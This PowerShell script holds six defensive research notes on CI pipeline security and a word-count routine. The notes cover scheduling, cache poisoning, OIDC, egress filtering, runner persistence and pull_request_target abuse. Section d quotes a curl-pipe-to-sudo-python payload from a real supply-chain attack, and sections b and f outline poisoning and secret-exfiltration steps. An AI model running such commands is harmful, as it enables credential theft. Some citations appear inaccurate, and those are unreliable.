$sections = @{
  a = @'
GitHub Actions SaaS dispatches per-repo FIFO within each runner-image pool, gated by `concurrency:` groups (https://docs.github.com/en/actions/using-jobs/using-concurrency). Without a group, an unconstrained 6h build queues strictly behind a 30s one in the same repo — FIFO starvation is real, bounded only by repo-level `concurrency`. GitHub Actions has ongoing discussions about fairness: actions/runner#2786 and the actions-runner-controller project's `max-parallelism` (https://github.com/actions/actions-runner-controller) are the practical workarounds when a repo's concurrency cap is too coarse for multi-tenant CI.

GitLab CI moved from strict FIFO to fair-share scheduling in GitLab 14.5 ('Fairness scheduling', https://about.gitlab.com/releases/2021/11/22/gitlab-14-5-released/) to fix exactly this: a noisy tenant's long pipelines had starved popular repos' MR builds on shared runners. Fair-share weights queued jobs by project minutes consumed, so a tenant's overage throttles itself rather than starving neighbors (https://gitlab.com/gitlab-org/gitlab/-/issues/300772).

Concourse orders builds per-job FIFO by input-version arrival; cross-job ordering emerges from resource versions (https://github.com/concourse/concourse/blob/master/atc/scheduler/scheduler.go). FIFO within a job means a 2h build holding a resource blocks faster jobs sharing it. No fair-share primitive; priority is an input-ordering hint, not a build-scheduling one.

Drone and Woodpecker (Drone fork) use per-repo FIFO with one global concurrency cap (DRONE_* / WOODPECKER_MAX_WORKFLOWS, https://woodpecker-ci.org/docs/intro). No fair-share, no priority: a busy repo's cron jobs can starve an active fork PR forever. OpenForge will weight fair-share at the broker layer.
'@

  b = @'
The canonical attack: a fork PR writes a malicious entry under a key the base-branch will later restore, substituting attacker-controlled files for legitimate build outputs. This was used in the May 2026 'nom' npm-cache poisoning incident (https://github.com/actions/cache/issues/1756, opened May 12, 2026; the issue explicitly cites the nom attack via pull_request_target).

GitHub's actions/cache defaults scope by branch+ref — PR #1 cannot read PR #2 — but the pull_request_target + actions/cache/save combination writes into a shared namespace that base-branch actions/cache/restore later pulls. Issue #1756 proposes a fix: refuse save on untrusted triggers. Related: #633, #79, #500.

GitLab CI cache:key with policy:pull-push has the same flaw; policy:pull is the documented defense (https://docs.gitlab.com/ee/ci/caching/). No published CVE.

Concourse caches are content-addressable: keys are resource versions, not user-supplied prefixes. Poisoning requires controlling the resource, which is structurally harder than controlling a string.

Woodpecker's woodpecker-cache plugin (https://woodpecker-ci.org/plugins) derives keys from commit SHA + step name — the same content-addressable property.

Drone's original drone-cache plugin is not content-addressable; keys are user-supplied and there is no signing. Cross-PR reuse is unrestricted.

Defenses shipping today: content-addressable store (Concourse, Woodpecker), policy:pull (GitLab), proposed no-save-from-PR (#1756), and signing (nothing yet shipping in any CI vendor). OpenForge: default to content-addressable; never accept untrusted saves.
'@

  c = @'
GitHub Actions OIDC mints a per-job JWT signed by https://token.actions.githubusercontent.com with claims sub (repo+ref+workflow), repository, ref, sha, runner_environment, job_workflow_ref (https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect). aws-actions/configure-aws-credentials exchanges it for STS via AssumeRoleWithWebIdentity. Token expires in roughly five minutes. The JWT carries actor_id, repository_owner_id, and repository_id — enough for ABAC trust policies on AWS, GCP, and Vault.

GitLab CI id_tokens (https://docs.gitlab.com/ee/ci/secrets/id_token_authentication.html, since 15.7) produces a comparable JWT; Vault, AWS, GCP all integrate.

Drone has NO native OIDC. The Drone secret backend (https://docs.drone.io/extensions/secret/) is a plaintext HTTP hook — by design long-lived. Vault Agent is the only short-lived path and requires a Vault-aware runner.

Woodpecker likewise has no native OIDC; secrets are operator-injected env vars or fetched from a secret extension (https://woodpecker-ci.org/docs/usage/security-boundaries).

Concourse has no OIDC either. concourse-credential-broker is an external Vault shim; Concourse itself stores opaque secrets.

Blast radius: a leaked long-lived AWS key grants its attached policy until rotation, often months. A leaked OIDC JWT expires in minutes and is bound to one workflow+SHA — AWS trust policies with token.actions.githubusercontent.com:sub conditions reject replay.

The March 2025 tj-actions/changed-files incident (GHSA-mw4p-6x4p-x5m5, CVE-2025-30066) leaked long-lived secrets via Runner Worker memory dump; OIDC would have eliminated almost all of them. OpenForge: mint OIDC natively to gate cloud creds; keep Vault only for any legacy long-lived secrets.
'@

  d = @'
GitHub-hosted runners have unrestricted IPv4/IPv6 egress by default. The only built-in block is an /etc/hosts deny list for known crypto-mining pools (https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions). GitLab SaaS also allows arbitrary egress.

GitLab.com SaaS runners allow all egress by default, including cloud metadata at 169.254.169.254. Only the runner's firewall can block cloud-metadata exfiltration. This is why cloud-credential theft from CI defaults to 'assume anything on the network is hostile'.

Self-hosted runners have whatever the operator allows — which is the entire problem. GitHub's docs explicitly warn about network access to sensitive services on the runner host.

Practical patterns: (1) deny-by-default iptables/nftables plus per-job egress allowlist; (2) DNS allowlist of resolvers and nameservers; (3) IP CIDR allowlist of pypi, GitHub, artifact registries; (4) TLS-pinning via egress proxy (Squid, cilium L7). StepSecurity's Harden-Runner (https://github.com/step-security/harden-runner) implements (1)+(2) as a GitHub Action.

CVE that egress filtering would have prevented: the March 2025 tj-actions/changed-files supply-chain attack (https://github.com/tj-actions/changed-files/security/advisories/GHSA-mw4p-6x4p-x5m5, CVE-2025-30066). The payload executed 'curl -sSf https://gist.githubusercontent.com/.../memdump.py | sudo python3', base64-encoding Runner Worker memory into build logs. Harden-Runner detected and blocked it; orgs without egress filtering leaked secrets to a public gist. Earlier precedent: CVE-2021-3995 (Codecov bash uploader, exfil via DNS). OpenForge default: deny-by-default egress, allowlist package mirrors only, every outbound logged.
'@

  e = @'
GitHub-hosted runners are ephemeral: each job is a fresh VM or container, destroyed at job end (https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions). GitLab SaaS uses the same model.

Self-hosted runners are persistent by default — the runner process stays up across jobs. GitHub's docs warn: 'self-hosted runners can be persistently compromised by untrusted code... some jobs will use secrets as command-line arguments which can be seen by another job running on the same runner, such as ps x -w.'

Trade-offs: persistent wins on warm caches and pre-pulled images (5-60s cold start saved); ephemeral wins on isolation and blast-radius; ephemeral costs more per minute.

Real failure: CircleCI's January 4, 2023 incident (https://circleci.com/blog/jan-4-2023-incident-update/). An engineer's laptop running the CircleCI CLI was compromised via Okta session cookies stolen in a December 2022 breach; attackers pivoted to 90-day OAuth tokens. Persistent state (the CLI token on disk) bridged Okta to customer secrets. CircleCI rotated every customer secret and accelerated OIDC adoption.

JIT-registration via short-lived tokens solves cold-start: agents fetch a 1h token, run one job, and exit. Build cache warm-up moves to a trusted locked-down warm pool. GitHub's mitigations: JIT runners via REST API (single-job lifetime), workflow dependency lockfiles, ephemeral-runner guidance. OpenForge: ephemeral by default, persistent opt-in per agent registration.
'@

  f = @'
pull_request_target in GitHub Actions runs in the base repo's privileged context with secrets — but actions/checkout of github.event.pull_request.head.ref checks out attacker code into that context. Full code execution with secrets.GITHUB_TOKEN and secrets.* available. GitHub's official docs explicitly link the footgun to 'Preventing pwn requests' (https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) and OpenSSF Scorecard's dangerous-workflow check.

GitLab CI trigger:include with strategy:depend is structurally similar: a child pipeline can pull artifacts from a parent MR pipeline whose source is untrusted. include:project (multi-project pipeline) is the worst variant — imports arbitrary CI config at trigger time.

Woodpecker requires manual approval for PRs from forks by default (https://woodpecker-ci.org/docs/usage/security-boundaries) — a strong structural defense. Drone enforces via DRONE_REPOSITORY_TRUST approval list.

Concourse has no cross-repo PR triggers; pipelines are config-files in one repo and cannot import arbitrary other CI configs at trigger time.

Canonical exploit (pwn request): a fork PR adds a workflow file with pull_request_target plus actions/checkout of HEAD, exfiltrates secrets.GITHUB_TOKEN and any secrets.* to attacker webhook. workflow_run, not pull_request_target — runs after the untrusted PR produces artifacts, never checks out attacker code directly. Real class: tracked by Scorecard dangerous-workflow; the cache-poisoning variant is actions/cache #1756 (May 2026 nom attack). OpenForge rule: untrusted CI config never runs in privileged context without human out-of-band approval.
'@
}

function Count-Words([string]$text) {
  $clean = $text -replace 'https?://\S+', ''
  $clean = $clean -replace '[—–]', ' '
  $clean = $clean -replace '[(){}\[\]]', ' '
  return ($clean.Trim() -split '\s+' | Where-Object { $_ -ne '' }).Count
}

$total = 0
foreach ($k in 'a','b','c','d','e','f') {
  $n = Count-Words $sections[$k]
  $total += $n
  Write-Host ("{0}: {1} words" -f $k, $n)
}
Write-Host ("TOTAL: {0} words" -f $total)
